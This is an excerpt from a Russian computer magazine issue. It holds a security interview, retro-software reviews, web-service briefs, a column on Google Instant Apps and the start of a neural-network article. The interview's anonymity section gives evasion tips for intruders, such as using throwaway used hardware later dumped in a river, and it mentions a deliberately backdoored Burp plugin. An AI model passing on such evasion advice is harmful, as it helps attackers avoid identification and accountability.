 вот в такое значение, то первое, что у тебя спросят: а что он делает? И почему
 именно в такое значение? И тут, если ты плаваешь, тебя могут просто вежливо
 попросить вначале разобраться самому и только потом давать советы другим.
   Сначала спрашиваем про ISO, про 152-ФЗ, про PCI DSS. Надо, что-
 бы ты знал теорию. Иначе как ты будешь секьюрить, если ты не знаешь, какую
 информацию надо защищать? Знание комплаенса, хоть в общих чертах, нам
 очень важно. Но это не будет стоп-сигналом на самом деле. Если чел скилло-
 вый, этому мы научить можем.
   Дальше — про вебочку. Первый же вопрос — SOP, Same Origin
 Policy. То есть мне не нужно слушать байки про XSS. Вначале надо вообще
 разобраться, на чем строится безопасность веба, как вообще браузер ра-
 ботает хоть в общих чертах :). Eсли мы здесь ни о чем не поговорили, значит,
 дальше мы расходимся. CSRF, XSS — это все хорошо, но это частности.
   Следующий вопрос — методы сегментации сети. Крутой вопрос. Ти-
 повой безопасник, который ко мне приходит, вообще никогда не видел боль-
 шую сеть, и, что с ней делать, он точно не знает. Этот вопрос, по правде го-
 воря, можем простить. Если человек всегда работал «с той стороны» (читай:
 ломал извне), естественно, он не знает, как секьюрить корпоративные сети.
 Обычно в этом случае предлагаем поговорить о TCP/IP — это вообще что та-
 кое? Мы ищем у человека общее понимание, как работает сеть. Если он знает,
 что такое IP-адрес, и на этом его понимание заканчивается — not really cool.
   Надо уметь читать чужой код и понимать его концепцию, идею,
 а не кусками пытаться что-то уловить. Видел когда-нибудь код на Spring
 и Struts? Он же совершенно нечитабелен, пока не повернешь голову под
 определенным углом. Если мы возьмем к себе чувака без понимания и дадим
 ему наши 19 миллионов строк кода на Spring, он сможет нам в чем-то помочь?
 Не думаю.

ОБ АНОНИМНОСТИ
 Базовый принцип безопасности — разделяй дом и работу. То есть ма-
 шину, на которой ты что-то делаешь, и машину, на которой ты ничего не дела-
 ешь. На одном компьютере ты хакер-мегапавнер, на другом — обычный Вася,
 и будет счастье. Если этого не делать, рано или поздно ты ошибешься.
   Тебя сливают именно те данные, которые ты вводишь сам. Никто,
 кроме тебя самого, тебя не сдаст. Настроил все как бы секьюрно — Tor, вир-
 туалка, а потом лезешь на свой блог проверять, работает ли интернет :).
   Если мы говорим про «защиту об блеков», это разделение машин
 очень хорошо работает. Заведи два компа. На этой машине у тебя пла-
 тежная информация: на этой машине ты ходишь в свой PayPal, QIWI-кошелек.
И вот другая машина, на которой ты занимаешься всякой фигней. Ну пойма-
 ешь ты малварь, ну похекают тебя. А на машине ничего ценнее пароля от од-
 норазовой почты нет.
   Надо иметь разные физические машины. Виртуалки — это тлен. От-
 дельная машина, только так. Виртуалки удобны, но рано или поздно спутаешь
 браузеры, все путают. Собственно, так обычно блеков и ловят, они сами па-
 лятся.
   Возьми хотя бы VPN. Ты работаешь, павнишь что-то. VPN моргнул на се-
 кундочку — и этого хватило. Всего один пакет, и отсветился твой реальный IP.
 Провайдер пишет трафик, три месяца минимум. Один-единственный трейс —
 и finita la comedia.
   Ломать из-под «мака» — вообще дурная затея, там слишком мно-
 го intercommunications. Ни один Little Snitch тебя не спасет. Никто не знает,
 что там в точности происходит, — вдруг OS X стучит на более низком уровне
 в обход всех твоих VPN и файрволов?
   Если тебе надо захайдиться, есть только одна реальная схема.
 Едешь в Митино, там покупаешь бэушную симку, бэушную мобилу и бэушный
 ноут. Едешь в ближайший большой город и там делаешь то, что тебе надо.
 А когда сделал — выкидываешь все в ближайшую речку. Вот это работает.
   Блечить с использованием общедоступных утилит — это тоже
 глупость. Стучат все. Особенно пентест-утилиты следят за тем, кто, что
 и как пентестит. Например, надо быть наивным, чтобы поверить, будто Burp
 Collaborator не записывает те запросы, которые на него приходят. Даже нет,
 похек бывает везде! Один раз ради шутки мы выложили плагин для Burp Suite
 с небольшой закладкой. Около нее написали: «Это шутка, парень! Если ты это
 нашел, то ты крутой, напиши нам!» Думаешь, кто-то откликнулся? Ни разу.
   Любое ПО, в котором используются сторонние либы, которые ты
 хотя бы не вычитал, — это по определению несекьюрно. Даже в энтер-
 прайзе используются мутные либы, которые никто не проверяет, что говорить
 об обычных приложениях?
PCZONE





 Денис Колисниченко
   dhsilabs@gmail.com
КАК ДЕЛА
У ДИНОЗАВРОВ

ТЕСТИРУЕМ ЛЮБИМЫЕ СТАРЫЕ ПРОГРАММЫ
В СОВРЕМЕННЫХ УСЛОВИЯХ


Кто же не знает Winamp, The Bat, ICQ, Far Manager,
WinRAR? Когда-то эти программы были установлены
на каждом компьютере. Живы ли они сейчас? Обновля-
ются ли? Будут ли последние доступные версии работать
в Windows 10? Давай проверим!

WINAMP
Проект официально мертв, и оживлять его, судя по всему, никто не собирает-
ся. На русском подсайте висит опрос, стоит ли закрывать ресурс. Ниже есть
последние новости, причем последние — в прямом смысле слова. Верхняя
датирована 31 декабря 2014 года и сообщает о том, что Winamp спасен. Вот
только с того времени — ни новых версий, ни новостей. Последний релиз
с числом зверя 5.666 появился 12 декабря 2013 года. На этом все.





                                                             Сайт ru.Winamp.com

Если сравнивать Winamp с динозавром, то это был бы тираннозавр, не мень-
ше. В 2009 году у «Винампа» было 70 миллионов пользователей. Только вду-
майся в эту цифру! К примеру, по последним данным, во Франции проживает
меньше людей — 64 миллиона. Армия пользователей Winamp больше, чем це-
лая страна.
   Однако 20 ноября 2013 года компания AOL, владеющая Winamp, объявила
о закрытии проекта. Несмотря на то что программа развивалась (к примеру,
успели выйти версии для OS X и Android) и у нее оставались миллионы пользо-
вателей по всему миру, в AOL посчитали дальнейшее вложение денег беспер-
спективным. Монетизировать бесплатный Winamp было непросто, особенно
учитывая, что число пользователей в США сокращалось стремительнее все-
го. Естественно, закрытие столь известного проекта не прошло незамечен-
ным — о нем тогда писали даже нетехнические СМИ.
   У этой истории было и продолжение, которое могло означать возрождение
Winamp. Через два месяца после объявления о закрытии бельгийская компа-
ния Radionomy Group, занимающаяся интернет-радиовещанием, подтверди-
ла, что выкупает Winamp у AOL. Именно поэтому на сайте ru.Winamp.com и по-
явилось сообщение о том, что Winamp спасен, вот только новых версий с того
времени так и не было.
   Впервые Winamp показали публике 21 апреля 1997 года. Последняя вер-
сия вышла в декабре 2013-го. Следовательно, проект прожил шестнадцать
лет. Неплохо, но это далеко не рекорд. В нашем обзоре будут и более древ-
ние продукты.
   Сможет ли наш тираннозавр работать в Windows 10? Качаем последнюю
версию 5.666 и пытаемся ее запустить. Динозавр определенно жив!





                                                     Winamp в Windows 10

Правда, содержимое библиотеки «Музыка» он увидел не сразу, пришлось до-
бавить его вручную. В целом никакого отторжения последняя версия Winamp
не вызывает. Наоборот, его современная обложка Bento выглядит вполне
эффектно.





                                                        Цветовая тема Blue Steel

Однако деваться некуда: офлайновые проигрыватели музыки потихоньку от-
мирают. Сейчас музыку принято слушать в онлайне — это быстрее, да и новых
исполнителей найти гораздо легче. Winamp и его более живые сородичи те-
перь нужны в основном меломанам, которые не могут расстаться с накоплен-
ной фонотекой. А еще десктопные плееры позволяют использовать эквалай-
зер — в онлайновых проигрывателях такой функции пока не встречается.
   Кстати, некоторые традиционные плееры имеют специальные плагины
для воспроизведения музыки из интернета. К примеру, AIMP умеет воспроиз-
водить музыку из «ВКонтакте». Ну и конечно, существует iTunes со встроенным
Apple Music и неофициальный десктопный плеер для Google Play Music.

THE BAT
The Bat — знаменитый почтовый клиент, разработанный молдавской компани-
ей RitLabs. Если от Winamp я в свое время отказался, то от почтового клиента
The Bat — нет, и продолжаю его использовать. Почему The Bat? Да потому, что
в нем очень удобно организована работа с несколькими почтовыми ящиками.
Думаю, пользователи The Bat, особенно те, которые раньше сидели с Outlook,
меня поймут.
   Да, в The Bat нет отдельных плюшек, которые бы пригодились для работы
в корпоративной среде, но многим пользователям это нисколько не мешает.
Если сравнивать The Bat с ископаемым, то я бы выбрал и чи — это динозавр,
напоминающий летучую мышь, который был найден на территории Китая. Вот
только называть The Bat ископаемым я бы не стал.





                                                                     The Bat 7

Проект по-прежнему жив и развивается. Первая версия, носившая статус беты,
увидела свет в марте 1997 года, последняя — 18 февраля 2016 года. На дан-
ный момент проекту девятнадцать лет — он пережил Winamp на три года и,
думаю, проживет еще долго: пока существует электронная почта и люди поль-
зуются Windows, у него есть все шансы.
  В седьмой версии появилась поддержка Microsoft Exchange Server 2007
и более поздних версий. Эту функцию я не проверял: протокол EWS для меня,
как и для тысяч домашних пользователей, неактуален. Также недавно была до-
бавлена возможность синхронизации адресных книг, что понравится пользо-
вателям, которые работают с контактами на разных устройствах. Технология
CardDAV позволяет синхронизировать адресную книгу The Bat с контактами
Google и iCloud.
   Вообще, за последние годы число функций The Bat серьезно вырос-
ло. Признаться честно, даже я, хоть и приверженный пользователь, не успеваю
не только все посмотреть и попробовать, но даже запомнить. К примеру, в по-
следних версиях появилась биометрическая аутентификация через Dekart BIO
API, шифрование почтовой базы и аппаратная аутентификация посредством
токенов. Все это подтверждает, что проект не топчется на месте, а живет пол-
ноценной жизнью.

ICQ
Еще лет десять назад сложно было представить, что у современного человека
может не быть «аськи». Теперь же все повально переходят на более продви-
нутые мессенджеры. Skype, WhatsApp, Viber, Facebook Messenger, Telegram...
В ICQ, если помнишь, не было даже встроенной поддержки картинок, а сейчас
аудио- и видеозвонками никого не удивишь, не говоря уже про мелочи вроде
стикеров.
   Чтобы проверить, как поживает ICQ сегодня, я запустил уже давно забытый,
но все еще установленный у меня QIP. Почему именно его? Дело в том, что
оригинальная ICQ была довольно громоздкой, а назойливая реклама отвле-
кала от общения. Приходилось искать альтернативы: у кого-то стояла Miranda,
у кого-то Trillian, на «Маке» был Adium, а в Linux (позднее и в Windows) — Pidgin.
QIP (Quiet Internet Pager) — простой и быстрый клиент, в котором нет рекламы.
   Правда, QIP тоже бывает разным. Лично мне больше всего нравилась са-
мая простая его версия — QIP 2005. Более навороченные QIP Infium и после-
довавшие за ним QIP 2010 и QIP 2012 мне не пришлись по душе. Зато если
QIP 2005 поддерживал только протокол ICQ, то его более продвинутые собра-
тья поддерживают Jabber, позволяют получать уведомления о новых письмах
на «Яндексе», Mail.Ru, Google, а также поддерживают протокол «ВКонтакте».
  Жив ли QIP? Последняя версия была выпущена 24 ноября 2014 года —
не так уж и давно. Однако сам сайт qip.ru переродился в какое-то подобие но-
востного канала — о мессенджере напоминает только кнопка «Скачать».
   Впрочем, вернемся к ICQ. Ее днем рождения считается 15 ноября 1996
года, то есть на данный момент ей почти двадцать лет. С тех пор многое из-
менилось. Сейчас ICQ принадлежит Mail.Ru Group, то есть можно сказать, что
«аська», подобно LiveJournal, стала отечественным сервисом.
  В Mail.Ru приложили серьезные усилия для оживления умирающего проек-
та: появились стикеры, изменился интерфейс, но главное — это то, что теперь
через ICQ можно звонить и передавать файлы объемом до 4 Гбайт. Кстати, QIP
2012 умеет совершать лишь аудиозвонки, так что, если ты хочешь не только слы-
шать, но и видеть собеседника, тебе нужна версия ICQ, сделанная в Mail.Ru.
   Ранее свой мессенджер на основе ICQ пытались сделать и в «Рамблере».
Он назывался Rambler-ICQ, позволял передавать файлы, поддерживал голо-
совое общение, видеосвязь и даже совместные игры. Кстати, Rambler сде-
лал свою «аську» не просто так. В 2005 году эта компания стала официальным
распространителем ICQ в России.
   Служба ICQ, как ты уже догадался, активна и по сей день. То есть ты мо-
жешь скачать любой из клиентов и общаться с другими пользователями. Даже
древний QIP 2005 (не говоря уже об оригинальной программе) запускается
и нормально работает в Windows 10. Вот только есть ли в этом смысл?





                                                             QIP 2005 в Windows 10

Аудитория ICQ сокращается с каждым днем. Из более чем трехсот контактов
в моем списке онлайн остались тринадцать. Не бог весть какая статистика,
но даже она говорит о многом: раньше почти весь контакт-лист в рабочий день
был зеленым.
  По состоянию на сентябрь 2013 года общая ежемесячная аудитория ICQ
в России составляла 7,9 миллиона (в мире — 12,3 миллиона), а в конце 2014
года — 6,7 миллиона в России и 11 миллионов в мире. Более новые данные,
скорее всего, еще плачевнее — видимо, поэтому в Mail.Ru их и не разглаша-
ют. С аудиторией того же Winamp не сравнить, поэтому ICQ потянет разве что
на звание карнотавра — динозавра со средним ростом в три метра.





                                                   Количество пользователей ICQ

Cоциальные сети и мессенджеры убили ICQ, однако в Mail.Ru не теряют на-
дежды возродить и осовременить культовый мессенджер. Проект, кстати,
с недавних пор опенсорсный, и исходники официального десктопного клиента
можно скачать с GitHub.

FAR MANAGER И ПРОЧИЕ ДВУХПАНЕЛЬНЫЕ МЕНЕДЖЕРЫ
Norton Commander сейчас жив разве что в воспоминаниях олдскульных юзе-
ров — тех, кто начинал знакомство с компьютером с DOS или еще раньше.
Пользоваться простым DOS было не очень-то удобно, поэтому разные версии
и клоны творения Питера Нортона когда-то были установлены примерно на ка-
ждом первом IBM-совместимом компьютере.
   А клонов и последователей  у Norton Commander множество:  Volkov
Commander, DOS  Navigator, Midnight Commander, Far Manager, Windows
Commander, Total Commander, — все уже не упомнить.
   После повального перехода с DOS на Windows многие продолжали пользо-
ваться двухпанельными менеджерами, и дольше всех задержались Far Manager
и Total Commander. Я был крайне удивлен, когда узнал, что Far до сих пор жив.
Последняя «ночная» сборка была выпущена прямо в день написания этой ста-
тьи — 19 мая 2016 года, а последняя стабильная сборка — 10 февраля.





                                                              Динозавр жив!

Первая версия Far Manager появилась 10 сентября 1996 года, то есть сей-
час Far почти двадцать лет. При этом последняя версия отлично работает
в Windows 10, поддерживает Unicode, умеет запрашивать права UAC, когда
это необходимо, и, конечно, не испытывает проблем ни с длинными именами
файлов, ни с файлами большого объема. В общем, Far — полноценный фай-
ловый менеджер с кучей плагинов, вот только выглядит он архаично. Впрочем,
как еще выглядеть настоящему живому динозавру?





                                                                         Far Manager

Лично я предпочитаю Total Commander — он смотрится гораздо современ-
нее. Этот проект тоже жив, последняя версия вышла 17 сентября 2015 года,
а версия для Windows Phone — в феврале 2016-го. Несмотря на моложавый
по сравнению с Far вид, ему почти двадцать три (!) года: первая версия появи-
лась 25 сентября 1993-го.





                                               Total Commander: все под тотальным контролем

Еще один популярный когда-то двухпанельный менеджер DOS Navigator дав-
но превратился в ископаемое — последняя версия вышла в конце 1999 года.
Она не запускается даже в Windows 7, не говоря уже про Windows 10. Правда,
не так давно активист с говорящим никнеймом Necromancer, вооружившись
открытыми в 1999 году исходниками, добавил в DOS Navigator поддержку
длинных имен файлов, многооконности и многих других полезных в современ-
ном мире вещей.





                                                        DOS Navigator

WINRAR
Еще одно известнейшее творение автора Far Manager Евгения Рошала — это
WinRAR. Как и Far, он жив без всяких оговорок: последний стабильный релиз
вышел в феврале 2016 года, а бета-версия 5.40 — в мае 2016-го.





                                                               WinRAR

Первая версия этого архиватора появилась 22 апреля 1995 года, следователь-
но, ему уже двадцать один год. Для программного продукта, поддерживаемого
к тому же одним-единственным разработчиком, это очень большой срок.
   Сравнивать с динозаврами его можно (возраст таки солидный), но вряд ли
это порадует многочисленных пользователей RAR. А вот есть ли в современ-
ном мире смысл паковать файлы чуть более сильным, чем ZIP, но менее рас-
пространенным методом — это уже совсем другой вопрос.

ARJ
Первым архиватором, с которым я познакомился, был не ZIP и не RAR. Это был
ARJ. Первая версия ARJ появилась в феврале 1991 года. Как у него дела сейчас?





                                                                 Архиватор ARJ

ARJ был преобразован в ARJ32 и официально поддерживает Windows 8, 7, Vista
и более древние версии. О поддержке Windows 10 на сайте ничего не сказано,
но в нем архиватор тоже отлично работает. Вряд ли, правда, кто-то будет им
пользоваться для чего-то, кроме разархивирования старых файлов. Ни гра-
фического интерфейса, ни возможности интегрировать ARJ в Windows не по-
явилось. Тем не менее сообщений о закрытии проекта не было, а последняя
версия выпущена в июне 2014 года. Возраст ARJ на сегодняшний день —
двадцать пять лет.

СОВЕТСКИЙ АНТИВИРУС AIDSTEST
Занятный факт для тех, кто родился после двухтысячного года: компьютерные
вирусы существовали и до интернета и передавались на дискетах, а чтобы из-
бежать заражения, люди использовали первые антивирусы. Одним из них был
отечественный Aidstest, его первая версия появилась 17 ноября 1988 года,
а создал ее Дмитрий Николаевич Лозинский. Именно эта программа поспо-
собствовала появлению антивируса Dr.Web — в нем были использованы мно-
гие наработки Aidstest.
   Проект давно мертв, но не упомянуть его было нельзя. Последняя версия
программы вышла 27 сентября 1997 года. Я не стал проверять, работает ли
она на реальном компьютере, зато известно, что сейчас она сама определя-
ется как вирус пятью сканерами. Заинтересовавшимся рекомендую статью
«Aidstest — день памяти советского антивируса».

NORTON DISK DOCTOR И NORTON UTILITIES
Если ты когда-нибудь пользовался Norton Utilities, значит, помнишь и старину
Norton Disk Doctor. Первая версия NDD была создана для DOS 1.x в далеком
1982 году, когда многие читатели этой статьи еще даже не родились. NDD,
увы, умер. Последняя версия Norton Utilities была выпущена в августе 2012
года. Поскольку это набор системных утилит, нет смысла пытаться запустить
их в Windows 10 — они совершенно точно не будут работать.





                                                 NDD 4.0, 1987 год


Компания Symantec приобрела Peter Norton Computing в 1990 году и раз-
вивала продукт еще двадцать два года, то есть возраст проекта — тридцать
лет. Сейчас Symantec переключилась на создание корпоративных продуктов
для обеспечения безопасности и закрыла проект Norton Utilities.

ЗАКЛЮЧЕНИЕ
Не все «динозавры» могут работать с самой последней версией Windows,
но многие из них живы и умирать в ближайшее время не собираются. Если
даже ARJ и DOS Navigator до сих пор кто-то пытается возродить, значит, такие
программы, как Far Manager, не исчезнут до тех пор, пока в их использовании
будет оставаться хоть какой-то смысл. А те, что уже умерли (Winamp или ICQ),
оставили мощнейший след в истории компьютеров. Если кто-то когда-то соз-
даст «палеонтологический музей софта», им можно будет смело отводить це-
лые залы.
PC ZONE





                                            Андрей Письменный
                                                      apismenny@gmail.com



       HYPERDEV — ОНЛАЙНОВАЯ СРЕДА РАЗРАБОТКИ НА NODE.JS
             hyperdev.com
 1





                            Представь, что тебе нужно быстро развернуть небольшой,
         но при этом динамический сайт. Скажем, проверить какую-то идею
         или на скорую руку создать инструмент, доступный через интернет.
         Если ты не открываешь подобные сайты ежедневно, то это потре-
          бует некоторых усилий: найти хостинг, а затем выбрать, развернуть
         и настроить кучу софта. Сервис HyperDev призван сделать всю пред-
         варительную подготовку ненужной: ты заходишь на hyperdev.com,
         и это все — твой сайт работает, можешь начинать кодить.
           За HyperDev стоит команда Fog Creek Software и ее руководитель
        Джоэл Спольски, известный как сооснователь Stack Overflow и Trello,
         а также автор популярного блога о программировании. Именно там
         31 июня 2016 года был впервые анонсирован проект HyperDev.
            Спольски с гордостью рассказывает, что пользователю HyperDev
         не нужно настраивать контроль версий, ковыряться с хостингом
         и что-либо устанавливать. Да что там, даже регистрироваться не обя-
          зательно! Впрочем, чтобы сохранить проект, нужно будет залоги-
          ниться через GitHub. Даже домен HyperDev сгенерирует для тебя
          автоматически. Он будет состоять из двух случайных слов и получит
         суффикс .hyperdev.space.
           Из серверных языков HyperDev пока что поддерживает только
           JavaScript, зато к Node.js можно устанавливать любые пакеты. Ра-
          ботать предполагается во встроенной IDE — она проста, но кое-что
          умеет, к примеру проверять синтаксис на лету. Тестировать сайт
         тоже очень удобно — если открыть его в соседнем окне, то он будет
          обновляться прямо по мере написания кода.
            Поддерживается даже коллективная работа в стиле Google Docs.
          Разработчики HyperDev полагают, что для не слишком серьезных
          проектов это будет удобной и ненавязчивой заменой контролю вер-
           сий. Да, код может не работать из-за изменений, которые только что
         внес коллега, ну и что? Зато можно вместе редактировать один файл!
            HyperDev пока что совершенно бесплатен, а потому твои про-
         граммы будут ограничены по ресурсам. В частности, доступно только
         64 Мбайт оперативной памяти и процессы не работают вечно, если
           к ним никто не обращается. Но самое суровое ограничение — это
          отсутствие возможности создавать закрытые репозитории. То есть
          твой код будет доступен другим пользователям, и они смогут его
         смотреть и форкать. Получается, что на HyperDev пока нельзя де-
          лать ничего серьезного, зато можно подглядывать в чужие проекты.
         Что ж, полезно для самообразования!

        DRAW.IO — РИСУЕМ ДИАГРАММЫ, БЛОК-СХЕМЫ И МОКАПЫ
              Draw.io
 2





                            Что выбрать, если тебе срочно нужно нарисовать какую-нибудь
         схему? В Windows есть Visio, в Linux — уже страшно старая Dia,
          в OS X — OmniGraffle, во всех операционках работает yEd и еще куча
         софта для рисования диаграмм. Но если устанавливать и тем более
          покупать ничего не хочется, то идеальным вариантом будет редак-
          тор Draw.io. Несмотря на то что он работает в браузере, его возмож-
          ности мало в чем уступают десктопным аналогам.
            У Draw.io неплохой набор фигур: есть заготовки для рисования
         схем компьютерных сетей, баз данных и диаграмм UML; в настрой-
           ках ты можешь включить и другие наборы — для электронных схем,
         интерфейсов iOS и Android, мокапов сайтов. Легко создать и свою
        форму и добавить в набор.
            Конечно же, есть самые разные настройки отображения текста
         и фигур: шрифты, расположение, обводки, заливки цветом или гра-
          диентом. Возможно, кому-то будет не хватать направляющих и ли-
           неек, зато, по крайней мере, есть слои.
              Draw.io поддерживает импорт файлов Visio, а сохранять умеет
           как в растровые форматы, так и в SVG. Причем можно залить доку-
         мент в Dropbox, и он будет сохраняться автоматически по ходу ре-
          дактирования.
          В общем, если иногда приходится рисовать сайт или диаграмму,
         смело добавляй в закладки.

        ECHOSIM.IO — AMAZON ECHO В БРАУЗЕРЕ
            Echo
3





                            Гаджет под названием Echo — это компьютер, у которого нет мо-
         нитора и клавиатуры, зато есть колонка и микрофон. Он стоит дома
         и ждет, пока пользователь обратится по имени к голосовому асси-
          стенту Alexa. Echo пока что продается только в США, разговарива-
          ет только на английском и завязан на американские реалии (к при-
          меру, сообщает прогноз погоды в градусах Фаренгейта). Но если
         тебе любопытно или ты хочешь начать писать плагины («скиллы»)
         для Alexa, то можешь прямо сейчас попробовать Echo в браузере.
             Echosim.io — проект одного разработчика, созданный на скорую
          руку в ходе хакатона. По сути, это всего лишь обертка для публично
          доступного Alexa Voice Service. Сайт прост как валенок: ты зажима-
        ешь кнопку и говоришь в микрофон, а Alexa отвечает. Важный ню-
           анс: поддерживаются не все браузеры. К примеру, ни в десктопном,
         ни в мобильном Safari сайт не заработает. Зато работает в Chrome.
            Если тебя вдохновят возможности Alexa, то ты можешь ис-
          пользовать Alexa Voice Service в своих проектах: к примеру, сде-
          лать самопальный Echo из Raspberry Pi (по ссылке — подробней-
        шее руководство) или придумать новый скилл. Вот крутой пример
         для вдохновения: человек научил Alexa открывать дверь гаража и да-
          вать команду автомобилю Tesla, чтобы он самостоятельно выехал.
           А вот для чего Echosim использовать нельзя, так это для прослу-
         шивания музыки через Spotify. Жаль, это источник как минимум по-
         ловины радости для пользователей Echo.
СЦЕНА: Колонка Андрея Письменного




 ЧЕМ GOOGLE INSTANT
APPS ГРОЗЯТ ИНТЕРНЕТУ





                         Андрей
                     Письменный




Границу между веб-сайтами и приложениями усиленно сти-
рали последние десять лет, но так и не стерли. Наоборот, с
расцветом мобильных телефонов приложения вернулись и
никуда не собираются уходить. Технология Instant Apps —
это подход к той же проблеме с другой стороны. Что, если
заменить сайты настоящими приложениями? Последствия
могут навсегда изменить интернет и имеют серьезные по-
бочные эффекты.



На прошедшем в середине мая Google I/O 2016 было показано много инте-
ресного — от вполне ожидаемой новой версии Android, об особенностях без-
опасности которой ты можешь прочесть в колонке Жени Зобнина, до магазина
приложений для виртуальной реальности. Но может статься, что самый важный
анонс — это не Android N, не виртуальная реальность и не Google Home, а не-
что под названием Instant Apps.
   Вот базовый пример использования Instant Apps. Ты при помощи телефона
или планшета с Android ищешь в интернете какой-то товар и жмешь на ссылку
в поисковой выдаче. И вместо сайта магазина твое устройство загрузит некую
минимальную версию приложения, в которой будет только информация об этом
товаре и кнопка «Купить».





                           Пример с презентации: ищешь рюкзак в Google
                            и сразу заказываешь в подгруженной части приложения

Казалось бы, принципиальной разницы по сравнению с сайтами нет (автор
веб-комикса xkcd уже успел поиронизировать над этим). Но шутки шутками,
а отличия все же имеются, и очень важные.
   Во-первых, ты можешь немедленно совершить покупку, используя уже име-
ющиеся в телефоне данные кредитной карты. Во-вторых, с твоего разрешения
приложение может получить доступ к датчикам телефона и сохраненной в нем
информации. В-третьих, у приложения может быть более отзывчивый интер-
фейс, чем у сайта.
   Технически это реализовано следующим образом: разработчик строит свою
программу так, чтобы у нее была легко отделимая часть, которую можно за-
гружать отдельно. Создавать новую ветку кода при этом не обязательно, глав-
ное — в нужном месте вызвать программные интерфейсы Instant Apps. Прило-
жение отправляется в Google Play, и остальное — это уже магия Google. Когда
поисковик решит, что вместо сайта можно показать приложение, он запросит
его из Google Play и покажет пользователю.
   При этом не факт даже, что Instant Apps будет загружаться дольше, чем сайт,
и потратит больше трафика. Многие современные сайты страдают проблемой
ожирения, и нередко можно встретить страницы, которые засасывают из ин-
тернета по десять мегабайт. Этого хватило бы на целое приложение, так что
если его часть будет занимать, скажем, мегабайт, то это вряд ли сегодня ко-
го-то напугает.
   Посетители Google I/O аплодировали этому анонсу не зря. Кажется, он ре-
шает массу проблем и открывает большие возможности. Беда с приложениями
в том, что часто бывает нужно немедленно использовать какую-то программу
и для этого ее требуется скачать, а она, быть может, занимает слишком много,
чтобы качать по сотовой сети. Причем следующий раз, когда она понадобится,
может наступить, к примеру, через месяц или не наступить вовсе.
   Моментальная подгрузка только самой необходимой части приложения по-
зволит обойтись без установки и не забивать телефон. Это удобно, когда ты,
скажем, хочешь заказать доставку чего-то или, к примеру, желаешь арендовать
велосипед во время прогулки по другому городу.





                          Жизненные примеры: заказ и оплата товара, просмотр
                              рецепта в приложении, оплата парковки

Казалось бы, у Instant Apps сплошные плюсы и никаких минусов. Пользователи
компьютеров и всяких там айфонов будут видеть обычный сайт, а Android вме-
сто него загрузит свой кусочек программы из Google Play. «Моментальные при-
ложения» пригодятся любому изданию, любому онлайновому магазину, а так-
же множеству реальных магазинов, кафе, музеев, выставок, да что там — даже
обычным предметам, в которые сейчас всё чаще встраивают компьютеры.
   Но разреши напомнить тебе один важный исторический пример. В конце
восьмидесятых годов, когда Microsoft Word был одним из множества конкури-
рующих текстовых процессоров, никто не жаловался на то, что его стандарт за-
крыт. Наоборот, это было нормой — свой стандарт файлов был у каждой про-
граммы.
   Зато когда популярность Windows и Word сделали его формат фактически
единственным стандартом текстовых документов, то тут уже начались разгово-
ры, что неплохо бы открыть его для всех. В течение многих лет это было очень
острой проблемой, и до сих пор она решена не до конца.
   Что, если популярность Android и поисковика Google сделают Instant Apps
новым стандартом сайтов? Вместо веба, где можно заглянуть в код любой
страницы, мы получим веб, состоящий из байт-кода Java.
   Можно, конечно, посмеяться и сказать, что это давняя и несбывшаяся меч-
та инженеров Sun Microsystems. Но они-то представляли себе, что програм-
мы на Java будут исполняться на любом компьютере с любой архитектурой,
а у Google получается так, что для запуска «инстант аппа» нужно иметь совме-
стимое устройство. И, кстати, абы какой Android не подойдет, ведь доступ к ма-
газину есть только в телефонах с лицензированной у Google версией системы.
Вот тебе и свобода с открытостью!
   К слову, речь потенциально не только про мобильные телефоны. Как из-
вестно, в Chrome OS активно встраивают поддержку приложений для Android,
и нет никаких причин не добавить и Instant Apps. Хромбуки тем временем уве-
ренно набирают популярность. В США благодаря интересу со стороны обра-
зовательных учреждений они, по подсчетам IDC, уже продаются лучше «маков»
(десктопов и ноутбуков).
   Магазины приложений отбирают хлеб у сайтов уже не первый год, так что по-
явление Instant Apps вряд ли можно считать внезапным событием. На ум, кста-
ти, приходят две другие новые технологии — гугловская же Accelerated Mobile
Pages (AMP) и Facebook Instant Articles. Обе по духу близки к Instant Apps и на-
целены на то, чтобы лучше приспособить для телефонов текстовый контент.
   Конечно, паниковать и кричать, что Google убивает веб, пока рано. Сложно
спорить с тем, что от Instant Apps будет много пользы, да и бороться с прогрес-
сом — не лучшая затея. Мобильные телефоны еще не закончили менять при-
вычный технологический ландшафт, и Instant Apps — не последнее проявление
этого процесса. Жаль только, что изменения часто ведут к повышению закры-
тости и фрагментации.





                            Открытый веб уже не тот, но, по крайней мере, эта стра-
                            ница работает в любом современном браузере

А еще, конечно, никто не знает, победит эта технология или нет, насколько она
в итоге будет распространенной и какими окажутся следующие шаги Google. Вот
еще интересный вопрос — как отреагируют в Apple? Появится ли в iOS прямой
аналог или, быть может, в Купертино придумают кардинально другой подход?
  И напоследок — другой исторический пример. Помнишь Flash? Его созда-
тели хотели сначала внедрить свою суперпрогрессивную технологию в сайты
(и это неплохо удалось), а затем сделать так, чтобы она заменила собой веб
(и вот это уже не вышло). А по прошествии какого-то времени Flash стал нена-
вистной дырявой фигней, от которой все спешат избавиться как можно скорее.
Instant Apps в Google, по крайней мере, смогут в любой момент выключить.
СЦЕНА
ГЛУБОКИЙ
ИНТЕЛЛЕКТКАК ЗАРОДИЛИСЬ
НЕЙРОСЕТИ
И ПОЧЕМУ
ОНИ ИЗМЕНЯТ
ВСЁ





   Евгений Зобнин
    zobnin@gmail.com





Новости о нейронных сетях появляются каждый день. То
сети научились определять пол и возраст людей по фото-
графии, то обыграли человека в очередную настольную
игру, то начали генерировать научные тексты, код прило-
жений и писать картины в духе Сальвадора Дали. А завтра
Скайнет отберет у тебя работу, автомобиль, жизненное
пространство, а тебя самого... нет, не утилизирует, а удоб-
но разместит на диване и заставит ничего не делать, на-
слаждаясь безусловным доходом. Или все-таки нет?

РОЖДЕНИЕ МИФА
Исследователи и компании, которые работают с большими объемами данных,
применяют нейросети еще с восьмидесятых годов, а вот рядовые земляне об-
ращают внимание на прогресс в этой области только после показательных по-
бед машин над людьми. Deep Blue обыграл Каспарова! Watson обошел людей
в Jeopardy! А теперь гугловский AlphaGo победил Ли Седоля — одного из луч-
ших игроков в го на сегодняшний день.
   Последний случай особенно интересен. Выигрышную стратегию в го про-
сто невозможно запрограммировать традиционными методами. Количество
вероятных комбинаций уже после первого хода здесь равно 129 960 (в шахма-
тах, для сравнения, — четыреста), а за весь матч их набирается больше, чем
атомов во Вселенной. Алгоритм просчета ходов не в состоянии продумать все
возможные комбинации и проигрывает профессиональным игрокам, которые
полагаются на интуицию, выработанную годами тренировок.
   У AlphaGo есть если не интуиция,
